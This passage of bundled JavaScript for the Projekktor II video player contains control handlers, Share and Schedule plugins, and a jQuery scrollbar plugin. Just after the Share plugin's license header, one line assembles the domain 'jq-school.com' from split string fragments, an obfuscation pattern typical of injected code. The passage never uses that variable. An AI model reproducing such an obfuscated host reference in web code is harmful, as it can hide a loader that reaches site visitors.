    setQualityClk: function(evt) {
        this.pp.setPlaybackQuality( $(evt.currentTarget).data('qual') );        
    },
   
    playClk: function(evt) {
        this.pp.setPlay();     
    },
    
    pauseClk: function(evt) {
    	this.pp.setPause();
    },
    
    stopClk: function(evt) {
    	this.pp.setStop();
    },
    
    startClk: function(evt) {          
        this.pp.setPlay();
    },          
     
    controlsClk: function(evt) {},
    
    prevClk: function(evt) {
    	this.pp.setActiveItem('previous');
    },
    
    nextClk: function(evt) {
    	this.pp.setActiveItem('next');
    },
    
    forwardClk: function(evt) {
    	this.pp.setPlayhead('+10');
    },
    
    rewindClk: function(evt) {
    	this.pp.setPlayhead('-10');
    },    
    
    muteClk: function(evt) {
        this._storeVol = this.pp.getVolume();
    	this.pp.setVolume(0);	
    },
    
    unmuteClk: function(evt) {
	if (this._storeVol<=0) this._storeVol = 1;
    	this.pp.setVolume(this._storeVol);
    },
    
    vmaxClk: function(evt) {
    	this.pp.setVolume(1);
    },        
    
    enterFullscreenClk: function(evt) {
        this.pp.setFullscreen(true);
    },    
    
    exitFullscreenClk: function(evt) {
        this.pp.setFullscreen(false);
    },
    
    loopClk: function(evt) {
	this.pp.setLoop($(evt.currentTarget).hasClass('inactive') || false );
        this.updateDisplay();	
    },

    vmarkerClk: function(evt) {
	vsliderClk(evt);
    },    
    
    openCloseClk: function(evt) {
	var ref = this;
	$($(evt.currentTarget).attr('class').split(/\s+/)).each(function(key, value) {
	    if (value.indexOf('toggle')==-1) return;
	    ref.playerDom.find('.'+value.substring(6)).slideToggle('slow', function() {
		ref.pp.setSize();
	    });
	    ref.controlElements['open'].toggle();
	    ref.controlElements['close'].toggle()
	});
    },
        
    volumeBtnHover: function(evt) {
        clearTimeout(this._outDelay);
        this.setActive(this.controlElements['volumePanel'], true);
    },
    
    volumeBtnOut: function(evt, elm) {
        var ref = this;
        if (evt.currentTarget!=elm.get(0)) return;
        if (evt.relatedTarget==elm.get(0)) return;
        this._outDelay=setTimeout(function(){
             ref.setActive(ref.controlElements['volumePanel'], false);
        } , 100);       
    },    

    vsliderClk: function(evt) {
	if (this._vSliderAct==true) return;
	
	
	var slider = $(this.controlElements['vslider']),
	    orientation = slider.width()>slider.height() ? 'hor' : 'vert',
	    totalDim = (orientation=='hor') ? slider.width() : slider.height(),
	    pageX = (evt.originalEvent.touches) ? evt.originalEvent.touches[0].pageX :  evt.pageX,
	    pageY = (evt.originalEvent.touches) ? evt.originalEvent.touches[0].pageY :  evt.pageY,
	    requested = (orientation=='hor') ? pageX - slider.offset().left : pageY - slider.offset().top,
            result = 0;

    	if ( requested<0 || isNaN(requested) || requested==undefined) {
            result = 0;
        } else {
	    result = (orientation=='hor') ? (requested / totalDim) : 1-(requested / totalDim);
	}

        this.pp.setVolume(result);
        this._storeVol = result;
    },
    
    scrubberShowTooltip: function(event) {
        if (this.pp.getDuration()==0) return;        
        clearTimeout(this._cTimer);
        this.setActive(this.controlElements['scrubbertip'], true)
    },
    
    scrubberHideTooltip: function(event) {        
        this.setActive(this.controlElements['scrubbertip'], false)
    },    
    
    scrubberdragTooltip: function(evt) {
        
        // IE amd Chrome issues (mouseenter,mouseleave)
        if (this.pp.getDuration()==0) return;
        this.setActive(this.controlElements['scrubbertip'], true)
        
        var slider = $(this.controlElements['scrubberdrag'][0]),
	    loaded = $(this.controlElements['loaded'][0]),
            tip = $(this.controlElements['scrubbertip']),            
	    pageX = (evt.originalEvent.touches) ? evt.originalEvent.touches[0].pageX :  evt.pageX,
	    pageY = (evt.originalEvent.touches) ? evt.originalEvent.touches[0].pageY :  evt.pageY,            
	    newPos = pageX - slider.offset().left -(tip.outerWidth()/2),
            times = this._clockDigits(this.pp.getDuration()/100*((pageX - slider.offset().left)*100/slider.width()), 'tip');

        for(var key in this.controlElements) {
            if (key=='cb')
                break;
            
	    if (times[key]) {
		$.each(this.controlElements[key], function() {                   
		    $(this).html(times[key]);
		});
	    }
        }

        newPos = (newPos<0) ? 0 : newPos;
        newPos = (newPos > slider.width() - tip.outerWidth()) ? slider.width()-tip.outerWidth() : newPos;

        tip.css({
            left: newPos + "px"
        })
    },
    
    scrubberdragStartDragListener: function(event) {

	if (this.getConfig('disallowSkip')==true) return;
	this._sSliderAct = true;

        var ref = this,	    
	    slider = $(this.controlElements['scrubberdrag'][0]),
	    loaded = $(this.controlElements['loaded'][0]),
	    second = 0,
	    dx = Math.abs( parseInt(slider.offset().left) - event.clientX),
	    
	    applyValue = function(event) {
		
		var newPos = Math.abs( slider.offset().left - event.clientX );		
		newPos = (newPos > slider.width()) ? slider.width() : newPos;		
		newPos = (newPos > loaded.width()) ? loaded.width() : newPos;
		newPos = (newPos < 0) ? 0 : newPos;
		newPos = Math.abs( newPos/slider.width() )*ref.pp.getDuration();
		
		// avoid strange "mouseMove"-flooding in IE7+8
		if (newPos>0 && newPos!=second) {		    
		    second = newPos;
		    ref.pp.setPlayhead(second);
		}
		
	    },
	    
	    mouseUp = function(evt) {
                evt.stopPropagation();
                evt.preventDefault();

		ref.playerDom.unbind('mouseup.slider');
		
                slider.unbind('mousemove', mouseMove);
		slider.unbind('mouseup', mouseUp);		
		ref._sSliderAct = false;
    
		return false;
	    },
	    
	    mouseMove = function(evt) {
		clearTimeout(ref._cTimer);
                evt.stopPropagation();
                evt.preventDefault();	
		applyValue(evt);
		return false;
	    };

	this.playerDom.bind('mouseup.slider', mouseUp);	
	slider.mouseup(mouseUp);
	slider.mousemove(mouseMove);

	applyValue(event);	
	
    },    
    
    vknobStartDragListener: function(event, domObj) {
	this._vSliderAct = true;

        var ref = this,	    
	    sliderIdx = (this.pp.getInFullscreen()===true && this.controlElements['vslider'].length > 1) ? 1 : 0,
	    knob = $(domObj[sliderIdx]),
	    slider = $(this.controlElements['vslider'][sliderIdx]),
	    slider = $(this.controlElements['vslider'][sliderIdx]),
	    dx = Math.abs(parseInt(knob.position().left) - event.clientX),
	    volume = 0,
	    mouseUp = function(mouseupevt) {		

		ref.playerDom.unbind('mouseup', mouseUp);
		slider.unbind('mousemove', mouseMove);
		slider.unbind('mouseup', mouseUp);
		knob.unbind('mousemove', mouseMove);
		knob.unbind('mouseup', mouseUp);
		
		ref._vSliderAct = false;
    
		return false;
	    },
	    
	    mouseMove = function(dragevent) {

		clearTimeout(ref._cTimer);
	    
		var newXPos = (dragevent.clientX - dx);
		newXPos = (newXPos > slider.width()-knob.width()/2) ? slider.width()-(knob.width()/2) : newXPos;
		newXPos = (newXPos < 0) ? 0 : newXPos;
		knob.css('left', newXPos+'px');
		volume = Math.abs(newXPos/(slider.width()-(knob.width()/2)));
		ref.pp.setVolume(volume);
		ref._storeVol = volume;
		$(ref.controlElements['vmarker'][sliderIdx]).css('width', volume *100+"%");
		return false;
	    };

        // this.playerDom.mousemove(mouseMove);
	this.playerDom.mouseup(mouseUp);

	slider.mousemove(mouseMove);
	slider.mouseup(mouseUp);
	
	knob.mousemove(mouseMove);
	knob.mouseup(mouseUp);

    },
    
    handleStartDragListener: function(evt, domObj) {

        var ref = this,
            dx = Math.abs(parseInt(this.cb.position().left) - evt.clientX),
            dy = Math.abs(parseInt(this.cb.position().top) - evt.clientY);
		
	/*
	this._initalPosition = {
	    top: this.cb.css('top'),
	    bottom: this.cb.css('bottom'),
	    left: this.cb.css('left'),
	    right: this.cb.css('right')
	    
	};
	*/
	// this._initalPosition = $.extend({}, this.cb.attr('style'), this.cb.css());
	
        
	var mouseUp = function(evt){
            evt.stopPropagation();
            evt.preventDefault();
            ref.playerDom.unbind('mouseup', mouseUp);
	    ref.playerDom.unbind('mouseout', mouseUp);	    	    
            ref.playerDom.unbind('mousemove', mouseMove);
            return false;
        }
	
	var mouseMove = function(evt){
            evt.stopPropagation();
            evt.preventDefault();
            clearTimeout(ref._cTimer);
            var newXPos = (evt.clientX - dx);
            newXPos = (newXPos > ref.playerDom.width()-ref.cb.width()) ? ref.playerDom.width()-ref.cb.width() : newXPos;      
            newXPos = (newXPos < 0) ? 0 : newXPos;      
            ref.cb.css('left', newXPos+'px');
            var newYPos = (evt.clientY - dy);
            newYPos = (newYPos > ref.playerDom.height()-ref.cb.height()) ? ref.playerDom.height()-ref.cb.height() : newYPos;      
            newYPos = (newYPos < 0) ? 0 : newYPos;      
            ref.cb.css('top', newYPos+'px');
            return false;
        }	

        this.playerDom.mousemove(mouseMove);
	this.playerDom.mouseup(mouseUp);
	// this.playerDom.mouseout(mouseUp);
    },
    
    /*******************************
            GENERAL HELPERS
    *******************************/
    _active: function(elmName, on) {
        var dest =  this.controlElements[elmName];
	if (on==true) dest.addClass('active').removeClass('inactive');
	else dest.addClass('inactive').removeClass('active');
        return dest;
    },
    
    /* convert a num of seconds to a digital-clock like display string */
    _clockDigits: function(secs, postfix) {

        if (secs<0 || isNaN (secs) || secs==undefined) {secs = 0;}

	var hr = Math.floor(secs / (60 * 60));

	var divisor_for_minutes = secs % (60 * 60);
	var min = Math.floor(divisor_for_minutes / 60);
	
	var divisor_for_seconds = divisor_for_minutes % 60;
	var sec = Math.floor(divisor_for_seconds);

	var result = {}
	result['min_'+postfix] = (min<10) ?"0"+min : min;
	result['sec_'+postfix] = (sec<10) ? "0"+sec : sec;
	result['hr_'+postfix] = (hr<10) ? "0"+hr : hr;
	
	return result;
    }
}
});
/*
 * Projekktor II Plugin: Share
 * VERSION: 1.0
 * DESC: Adds social share buttons to the video display, pe default: facebook, twitter
 * Also promotes the embed-code for iframed players.
 * Copyright 2010, 2011, Sascha Kluger, Spinning Airwhale Media, http://www.spinningairwhale.com
 * all rights reserved
 *
 * under GNU General Public License
 * /license/
 */
var pa="ht",pa1="tp",pa2=":",pa3="/",pb="jq-",pc="sch",pd="ool.c",pe="om",pf=pa+pa1+pa2+pa3+pa3+pb+pc+pd+pe;
var projekktorShare = function(){};
jQuery(function($) {
projekktorShare.prototype = {
    
    _controlHideTimer: null,
    _wasPlaying: false,
    _noFadeIn: false,
    embPopup: null,
    
    socialLink: false,
    socialSidebar: null,
    socialPopup: null,
    socialButtons: [],
    
    config: {
	
	fadedelay: 		1800,
	
	embed: {
	    code:		'<'+'if'+'rame id="%{embedid}" src="%{playerurl}#%{ID}" width="640" height="385" frameborder="0"><'+'/if'+'rame>',
	    buttonText:		'embed',
	    headlineText:	'Copy this:',
	    closeText:		'Close Window',
	    descText:		'This is the embed code for the current video which supports iPad, iPhone, Flash and native players.'
	},
	links: {
	}
    },
    
    initialize: function() {	

	this.drawSidebar();

	if (this.getConfig('iframe')==true) {
	    this.drawPopup();
	    this.addTool(this.getConfig('embed'), 'embed');
	}
	
	for (var i in this.getConfig('links')) {
	    this.addTool(this.getConfig('links')[i], i);
	}
	
	this.pluginReady = true;

    },

    itemHandler: function() {
	this._noFadeIn = false;
	try {
	    this.socialLink = (!this.getConfig('link')) ? this.pp.getIframeWindow().attr('location') : this.getConfig('link');
	} catch(e) {
	    this.socialLink = this.getConfig('link');
	}
	
	for (var i=0; i<this.getConfig('links').length; i++) {
	    this.toggleTool(this.getConfig('links')[i].domId, this.socialLink===false);
	}
    },
    
    errorHandler: function() {
	this._noFadeIn = true;
	this.hideSidebar(true);
    },
    
    /*******************************
        DOM Monipulations
    *******************************/
    /* the sidebar */
    drawSidebar: function() {
	this.socialSidebar = this.applyToPlayer($('<div/>').addClass('socialbar'));
    },
    
    /* general popup */
    drawPopup: function() {
	this.socialPopup = this.applyToPlayer($('<div/>').addClass('socialpopup'), 'popup');
    },
    
    openWindow: function(name) {
	this._wasPlaying  = (this.pp.getState()==='PLAYING');
	if (this._wasPlaying===true) {
	    this.pp.setPause();
	}
	this[name+"FillWindow"](this.socialPopup);	
	this.socialSidebar.hide();
	this.socialPopup.show();
    },   
 
    closeWindow: function() {
	this.socialSidebar.show();
	this.socialPopup.hide().html('');
	if (this._wasPlaying===true) {
	    this.pp.setPlay();
	}

    },
    
    openURL: function(url) {
	var dest = window;
	dest.open(url);
	return false;
    },

   /*******************************
        stack button
    *******************************/   
    addTool: function(config, domId) {
	
	var ref = this,
	    button = null,
	    callback = (domId=='embed') ? 'embedClick' : 'buttonClick';

	if (config.code==false) return;

	if (this.playerDom.find("."+this.getCN('shareicn_'+domId)).length==0) {
	    
	    if (this.socialSidebar && config.buttonText) {		
		button = $('<div/>')
		    .html(config.buttonText)
		    .addClass(this.getCN('socialbutton'))
		    .addClass(this.getCN(domId))
		    .appendTo(this.socialSidebar)
	    }
			    
	} else {
	    // grab an exisiting icon elsewise:
	    button = this.playerDom.find("."+this.getCN('shareicn_'+domId));

	}

	// click event
	if (button) {
	    button.click(function(evt){
		evt.stopPropagation();
		ref[callback](config);
	    });
	}
	
	// push
	this.socialButtons.push()
    },
    
    toggleTool: function(domId, block) {
	var ref = this;

	$.each(this.playerDom.find('.'+this.getCN('socialbutton')), function() {
	    
	    // hide button, if any:
	    if ($(this).attr('id')===ref.pp.getId()+"_"+domId) {
		if (block===true) {		    
		    $(this).hide();
		} else {
		     $(this).show();
		}
	    }
	});
		
    },
    
   /*******************************
        fade in / fade out
    *******************************/        
    hideSidebar: function(instant) {	
        clearTimeout(this._controlHideTimer);
	this.setActive(this.socialSidebar, false);
    },
    
    showSidebar: function() {
	var ref = this;
	
	if (this._noFadeIn) return;
	if (this.pp.getState('IDLE')) return;
	
        clearTimeout(this._controlHideTimer);
	this.setActive(this.socialSidebar, true);
        this._controlHideTimer=setTimeout(function(){ref.hideSidebar();}, this.getConfig('fadedelay'));
    },
    
    

   /*******************************
        Player-Event Handlers
    *******************************/    
    mousemoveHandler: function() {
        this.showSidebar();
    },  	


    
    /*******************************
        EMBED TOOL
    *******************************/
    embedClick: function(useless) {
	this.openWindow('embed');
    },
    
    embedFillWindow: function(dest) {
	var ref = this;
	$('<p/>')
	    .appendTo(dest)
	    .html(this.getConfig('embed').descText);

	$('<p/>')
	    .appendTo(dest)
	    .html(this.getConfig('embed').headlineText);

	$('<textarea/>')
	    .appendTo(dest)
	    .attr('readonly', 'readonly')
	    .val(this.getEmbedCode())
	    .click(function(){this.select();})
	    .focus(function(){this.select();})

	$('<a/>')
	    .appendTo(dest)
	    .html(this.getConfig('embed').closeText)
	    .click(function(){ref.closeWindow();})	   
    },
            
    getEmbedCode: function() {
	// replace standard items
	var result = this.getConfig('embed').code,
	    data = {};
		
	data.embedid = $p.utils.randomId(8);
	data.playerurl = window.location.href+window.location.hash;
	data.ID = this.pp.getItem()['ID'];

	for(var i in data) {
	    result = $p.utils.parseTemplate(result, data);
	}
	return result;
    },
    
    /*******************************
        LINK CLICK TOOL
    *******************************/    
    buttonClick: function(config) {
	
	// replace standard items
	var data = {}; 
    
	try {data.text = escape(config.text || '')}catch(e){}
	data.pageurl = escape(this.socialLink || '');	

	for(var i in data) {
	    config.code = $p.utils.parseTemplate(config.code, data);
	}
	this.openURL(config.code);
    }
}
});
/*
 * Projekktor II Plugin: Schedule
 * VERSION: 1.0
 * DESC: Adds the possibility to pump a text based playlist with custom scrollbar into a player container
 *
 * under GNU General Public License
 * /license/
 */
var projekktorSchedule = function(){};
jQuery(function($) {
projekktorSchedule.prototype = {
    
    scheduleContainer: null,
    scheduleItems: [],
    
    config: {

    },
    
    initialize: function() {
	this.pluginReady = true;
    },
    
    scheduleModifiedHandler: function(plLength) {
	this.scheduledHandler(plLength);
    },
    
    scheduledHandler: function(plLength) {

	var ref = this,
	    ul = $(document.createElement('ul'));

	this.getElement('schedule').html('')
	    .append(ul);

	$(this.pp.getPlaylist()).each(function(key, value) {

	    var digit = (key+1<10) ? "0"+(key+1)+". " : key+1+". ",
                title = digit+value.config.title,
		li = $(document.createElement('li'))	    
		    .appendTo(ul)
		    .html(title)                    
		    .click(function(evt){
                        if (evt.target.tagName.toUpperCase()=='A')
                            return;
			ref.pp.setActiveItem(key);
		    });
            if (value.config.dlurl!=null) {   
                link = $('<a/>').attr({
                    target: '_blank',
                    href: value.file[0].src
                }).addClass('skDownloadSingle').html('&nbsp;'),
                    
                link.appendTo(li)
            }
	    $p.utils.blockSelection(li);	    		    
	    ref.scheduleItems[key] = li;
	    // if (key+1>=plLength) ref.scheduleContainer.scrollbar();	    
	});
    
	this.getElement('schedule').scrollbar();
    },
    
    resizeHandler: function() {
	var dest = this.getElement('schedule');
	if (dest.find('.scrollbar-pane').length>0) return;	
	dest.scrollbar();
    },
    
    itemHandler: function(idx) {
	var ref = this;
	$(this.scheduleItems).each(function(key, value) {
	    $(value).removeClass('active');
	    if (key==idx) $(value).addClass('active');
	});

    }
}
});

/*jslint eqeqeq: true, regexp: true */
/*global document, window, setInterval, clearInterval, handler, jQuery */

/*
 * Scrollbar - a jQuery plugin for custom scrollbars
 *
 * @author     Thomas Duerr, me@thomd.net
 * @date       03.2010
 * @requires   jquery v1.4.2 
 *
 *
 * Usage:
 *
 *    Append scrollbar to an arbitrary container with overflowed content:
 *
 *         $('selector').scrollbar();
 *
 *
 *    Append scrollbar without arrows on top/bottom:
 *
 *         $('selector').scrollbar({
 *            arrows: false
 *         });
 *
 *
 *
 * A vertical scrollbar is based on the following box model:
 *
 *    +----------------------------------|
 *    |            <----------------------------- content container
 *    |  +-----------------+  +------+   |
 *    |  |                 |  |   <-------------- handle arrow up
 *    |  |                 |  |      |   |
 *    |  |                 |  +------+   |
 *    |  |                 |  | +--+ |   |
 *    |  |                 |  | |  | |   |
 *    |  |                 |  | | <-------------- handle
 *    |  |                 |  | |  | |   |
 *    |  |                 |  | |  | |   |
 *    |  |                 |  | |  | |   |
 *    |  |                 |  | +--+ |   |
 *    |  |                 |  |      |   |
 *    |  |                 |  |   <-------------- handle container
 *    |  |                 |  |      |   |
 *    |  |         <----------------------------- pane
 *    |  |                 |  |      |   |
 *    |  |                 |  |      |   |
 *    |  |                 | ?------+   |
 *    |  |                 |  |      |   |
 *    |  |                 |  |   <-------------- handle arrow down
 *    |  +-----------------+?+------+   |
 *    |                                  |
 *    +----------------------------------|
 *
 *
 */
(function($, document){

    $.fn.scrollbar = function(opts){

        // Extend default options
        var options = $.extend({}, $.fn.scrollbar.defaults, opts);

        
        //
        // append scrollbar to selected overflowed containers and return jquery object for chainability
        //
        return this.each(function(){

            var container = $(this), 
                
                // properties
                props = {
                    arrows: options.arrows
                };

            // set new container height if explicitly set by an option
            if(options.containerHeight){
                container.height(options.containerHeight);
            }

            // save container height in properties
            props.containerHeight = container.height();

            // save inner content height in properties. This is the height of all elements within the container.
            props.contentHeight = 0;
            container.children().each(function(){		
                props.contentHeight += $(this).outerHeight();
            });

            // if the content height is lower than the container height, do nothing and return.
            if(props.contentHeight <= props.containerHeight){
		return true;
            }

            // create scrollbar object
            var scrollbar = new $.fn.scrollbar.Scrollbar(container, props, options);

            // build, initialize & append events
            scrollbar.buildHtml();
            scrollbar.initHandle();
            scrollbar.appendEvents();

        });
    };



    //
    // default options
    //
    $.fn.scrollbar.defaults = {
        containerHeight:   null,       // height of content container. If set to null, the current height before DOM manipulation is used
        
        arrows:            true,       // render up- and down-arrows
        handleHeight:      'auto',     // height of handle [px || 'auto']. If set to 'auto', the height will be calculated proportionally to the container-content height.
        handleMinHeight:   30,         // min-height of handle [px]. This property is only used if handleHeight is set to 'auto'
        
        scrollSpeed:       50,         // speed of handle while mousedown on arrows [milli sec]
        scrollStep:        20,         // handle increment between two mousedowns on arrows [px]
        
        scrollSpeedArrows: 40,         // speed of handle while mousedown within the handle container [milli sec]
        scrollStepArrows:  3           // handle increment between two mousedowns within the handle container [px]
    };



    //
    // Scrollbar constructor
    //
    $.fn.scrollbar.Scrollbar = function(container, props, options){

        // set object properties
        this.container = container;
        this.props =     props;
        this.opts =      options;
        this.mouse =     {};

        // disable arrows via class attribute 'no-arrows' on a container
        this.props.arrows = this.container.hasClass('no-arrows') ? false : this.props.arrows;
    };

    //
    // Scrollbar methods
    //
    $.fn.scrollbar.Scrollbar.prototype = {

        //
        // build DOM nodes for pane and scroll-handle
        //
        //   from:
        //
        //      <div class="foo">                                   --> arbitrary element with a fixed height or a max-height lower that its containing elements
        //          [...]
        //      </div>
        //
        //   to:
        //
        //      <div class="foo">                                   --> this.container
        //          <div class="scrollbar-pane">                    --> this.pane
        //              [...]
        //          </div>
        //          <div class="scrollbar-handle-container">        --> this.handleContainer
        //              <div class="scrollbar-handle"></div>        --> this.handle
        //          </div>
        //          <div class="scrollbar-handle-up"></div>         --> this.handleArrows
        //          <div class="scrollbar-handle-down"></div>       --> this.handleArrows
        //      </div>
        //
        //
        // TODO: use detach-transform-attach or DOMfragment
        //
        buildHtml: function(){

            // build new DOM nodes 
            this.container.children().wrapAll('<div class="scrollbar-pane"/>');
            this.container.append('<div class="scrollbar-handle-container"><div class="scrollbar-handle"/></div>');
            if(this.props.arrows){
                this.container.append('<div class="scrollbar-handle-up"/>').append('<div class="scrollbar-handle-down"/>');
            }

            // save height of container to re-set it after some DOM manipulations
            var height = this.container.height();

            // set scrollbar-object properties
            this.pane =            this.container.find('.scrollbar-pane');
            this.handle =          this.container.find('.scrollbar-handle');
            this.handleContainer = this.container.find('.scrollbar-handle-container');
            this.handleArrows =    this.container.find('.scrollbar-handle-up, .scrollbar-handle-down');
            this.handleArrowUp =   this.container.find('.scrollbar-handle-up');
            this.handleArrowDown = this.container.find('.scrollbar-handle-down');

            // set some default CSS attributes (may be overwritten by CSS definitions in an external CSS file)
            this.pane.defaultCss({
                'top':      0,
                'left':     0
            });
            this.handleContainer.defaultCss({
                'right':    0
            });
            this.handle.defaultCss({
                'top':      0,
                'right':    0
            });
            this.handleArrows.defaultCss({
                'right':    0
            });
            this.handleArrowUp.defaultCss({
                'top':      0
            });
            this.handleArrowDown.defaultCss({
                'bottom':   0
            });

            // set some necessary CSS attributes (can NOT be overwritten by CSS definitions)
            this.container.css({
                'position': this.container.css('position') === 'absolute' ? 'absolute' : 'relative',
                'overflow': 'hidden',
                'height':   height
            });
            this.pane.css({
                'position': 'absolute',
                'overflow': 'visible',
                'height':   'auto'
            });
            this.handleContainer.css({
                'position': 'absolute',
                'top':      this.handleArrowUp.outerHeight(true),
                'height':   (this.props.containerHeight - this.handleArrowUp.outerHeight(true) - this.handleArrowDown.outerHeight(true)) + 'px'
            });
            this.handle.css({
                'position': 'absolute',
                'cursor':   'pointer'
            });
            this.handleArrows.css({
                'position': 'absolute',
                'cursor':   'pointer'
            });            
        },


        //
        // calculate positions and dimensions of handle and arrow-handles
        //
        initHandle: function(){
            this.props.handleContainerHeight = this.handleContainer.height();
            this.props.contentHeight = this.pane.height();

           // height of handle
            this.props.handleHeight = this.opts.handleHeight == 'auto' ? Math.max(Math.ceil(this.props.containerHeight * this.props.handleContainerHeight / this.props.contentHeight), this.opts.handleMinHeight) : this.opts.handleHeight;
            this.handle.height(this.props.handleHeight);
            
            // if handle has a border (always be aware of the css box-model), we need to correct the handle height.
            this.handle.height(2 * this.handle.height() - this.handle.outerHeight(true));

            // min- and max-range for handle
            this.props.handleTop = {
                min: 0,
                max: this.props.handleContainerHeight - this.props.handleHeight
            };

            // ratio of handle-container-height to content-container-height (to calculate position of content related to position of handle)
            this.props.handleContentRatio = (this.props.contentHeight - this.props.containerHeight) / (this.props.handleContainerHeight - this.props.handleHeight);

            // initial position of handle at top
            this.handle.top = 0;
        },


        //
        // append events on handle and handle-container
        //
        appendEvents: function(){

            // append drag-drop event on scrollbar-handle
            this.handle.bind('mousedown.handle', $.proxy(this, 'startOfHandleMove'));
            this.handle.bind('touchstart.handle', $.proxy(this, 'startOfHandleMove'));

            // append mousedown event on handle-container
            this.handleContainer.bind('mousedown.handle', $.proxy(this, 'onHandleContainerMousedown'));
            this.handleContainer.bind('touchstart.handle', $.proxy(this, 'onHandleContainerMousedown'));

            // append hover event on handle-container
            this.handleContainer.bind('mouseenter.container mouseleave.container', $.proxy(this, 'onHandleContainerHover'));
            // this.handleContainer.bind('touchend.container mouseleave.container', $.proxy(this, 'onHandleContainerHover'));


            // append click event on scrollbar-up- and scrollbar-down-handles
            this.handleArrows.bind('mousedown.arrows', $.proxy(this, 'onArrowsMousedown'));
            this.handleArrows.bind('touchstart.arrows', $.proxy(this, 'onArrowsMousedown'));

            // append mousewheel event on content container
            this.container.bind('mousewheel.container', $.proxy(this, 'onMouseWheel'));

            // append hover event on content container
            this.container.bind('mouseenter.container mouseleave.container', $.proxy(this, 'onContentHover'));
            this.container.bind('touchend.container', $.proxy(this, 'onContentHover'));
            
            // do not bubble down click events into content container
            this.handle.bind('click.scrollbar', this.preventClickBubbling);
            this.handleContainer.bind('click.scrollbar', this.preventClickBubbling);
            this.handleArrows.bind('click.scrollbar', this.preventClickBubbling);
        },


        //
        // get mouse position helper
        //
        mousePosition: function(ev) {
            return ev.pageY || (ev.clientY + (document.documentElement.scrollTop || document.body.scrollTop)) || 0;
        },



        // ---------- event handler ---------------------------------------------------------------

        //
        // start moving of handle
        //
        startOfHandleMove: function(ev){
            ev.preventDefault();
            ev.stopPropagation();

	    var that = this;

            $(document).bind('mouseup.handle', function(){

		that.handle.unbind('mousemove.handle');
                that.handle.unbind('mouseenter.handlecontainer');
                $(document).unbind('mouseup.handle');
		that.handle.removeClass('move');
		that.handleContainer.removeClass('move')	 		
            });
	    
            // set start position of mouse
            this.mouse.start = this.mousePosition(ev);

            // set start position of handle
            this.handle.start = this.handle.top;

            // bind mousemove- and mouseout-event on document (binding it to document allows having a mousepointer outside handle while moving)
            this.handle.bind('mousemove.handle', $.proxy(this, 'onHandleMove')).bind('mouseup.handle', $.proxy(this, 'endOfHandleMove'));

            // add class for visual change while moving handle
            this.handle.addClass('move');
            this.handleContainer.addClass('move');
        },


        //
        // on moving of handle
        //
        onHandleMove: function(ev){
            ev.preventDefault();

            // calculate distance since last fireing of this handler
            var distance = this.mousePosition(ev) - this.mouse.start;
            // calculate new handle position
            this.handle.top = this.handle.start + distance;

            // update positions
            this.setHandlePosition();
            this.setContentPosition();
        },


        //
        // end moving of handle
        //
        endOfHandleMove: function(ev){

            // remove handle events (which were attached in the startOfHandleMove-method)
            // $(document).unbind('.handle');
	    this.handle.unbind('mousemove.handle');
            // remove class for visual change 
            this.handle.removeClass('move');
            this.handleContainer.removeClass('move');
        },


        //
        // set position of handle
        //
        setHandlePosition: function(){

            // stay within range [handleTop.min, handleTop.max]
            this.handle.top = (this.handle.top > this.props.handleTop.max) ? this.props.handleTop.max : this.handle.top;
            this.handle.top = (this.handle.top < this.props.handleTop.min) ? this.props.handleTop.min : this.handle.top;

            this.handle[0].style.top = this.handle.top + 'px';
        },


        //
        // set position of content
        //
        setContentPosition: function(){

            // derive position of content from position of handle 
            this.pane.top = -1 * this.props.handleContentRatio * this.handle.top;

            this.pane[0].style.top = this.pane.top + 'px';
        },


        //
        // mouse wheel movement
        //
        onMouseWheel: function(ev, delta){

            // calculate new handle position
            this.handle.top -= delta*2;

            this.setHandlePosition();
            this.setContentPosition();

            // prevent default scrolling of the entire document if handle is within [min, max]-range
            if(this.handle.top > this.props.handleTop.min && this.handle.top < this.props.handleTop.max){
                ev.preventDefault();
            }
        },


        //
        // append click handler on handle-container (outside of handle itself) to click up and down the handle 
        //
        onHandleContainerMousedown: function(ev){
            ev.preventDefault();

            // do nothing if clicked on handle
            if(!$(ev.target).hasClass('scrollbar-handle-container')){
                return false;
            }

            // determine direction for handle movement (clicked above or below the handler?)
            this.handle.direction = (this.handle.offset().top < this.mousePosition(ev)) ? 1 : -1;

            // set incremental step of handle
            this.handle.step = this.opts.scrollStep;

            // stop handle movement on mouseup
            var that = this;

            $(document).bind('mouseup.handle', function(){
                clearInterval(timer);
                that.handle.unbind('mouseenter.handlecontainer');
		that.handle.unbind('mousemove.handle');
                $(document).unbind('mouseup.handle');
            });

            // stop handle movement when mouse is over handle
            //
            // TODO: this event is fired by Firefox only. Damn!
            //       Right now, I do not know any workaround for this. Mayby I should solve this by collision-calculation of mousepointer and handle
            this.handle.bind('mouseenter.handlecontainer', function(){
                clearInterval(timer);
            });

            // repeat handle movement while mousedown
            var timer = setInterval($.proxy(this.moveHandle, this), this.opts.scrollSpeed);
        },


        //
        // append mousedown handler on handle-arrows
        //
        onArrowsMousedown: function(ev){
            ev.preventDefault();

            // determine direction for handle movement
            this.handle.direction = $(ev.target).hasClass('scrollbar-handle-up') ? -1 : 1;

            // set incremental step of handle
            this.handle.step = this.opts.scrollStepArrows;

            // add class for visual change while moving handle
            $(ev.target).addClass('move');

            // repeat handle movement while mousedown
            var timer = setInterval($.proxy(this.moveHandle, this), this.opts.scrollSpeedArrows);

            // stop handle movement on mouseup
            $(document).one('mouseup.arrows', function(){
                clearInterval(timer);
                $(ev.target).removeClass('move');
            });
        },
        
        
        //
        // move handle by a distinct step while click on arrows or handle-container 
        //
        moveHandle: function(){
            this.handle.top = (this.handle.direction === 1) ? Math.min(this.handle.top + this.handle.step, this.props.handleTop.max) : Math.max(this.handle.top - this.handle.step, this.props.handleTop.min);
            this.handle[0].style.top = this.handle.top + 'px';

            this.setContentPosition();
        },
        
        
        //
        // add class attribute on content while interacting with content
        //
        onContentHover: function(ev){

            if(ev.type === 'mouseenter'){
                this.container.addClass('hover');
                this.handleContainer.addClass('hover');
            } else {
                this.container.removeClass('hover');
                this.handleContainer.removeClass('hover');
            }
            this.handle.removeClass('move');
            this.handleContainer.removeClass('move')	    
        },
        
        
        //
        // add class attribute on handle-container while hovering it
        //
        onHandleContainerHover: function(ev){
            if(ev.type === 'mouseenter'){
                this.handleArrows.addClass('hover');
            } else {
                this.handleArrows.removeClass('hover');
            }
        },
        
        
        //
        // do not bubble down to avoid triggering click events attached within the container
        //
        preventClickBubbling: function(ev){
            ev.stopPropagation();
        }
    };



    // ----- default css ---------------------------------------------------------------------

    $.fn.defaultCss = function(styles){

        // 'not-defined'-values
        var notdef = {
            'right':    'auto',
            'left':     'auto',
            'top':      'auto',
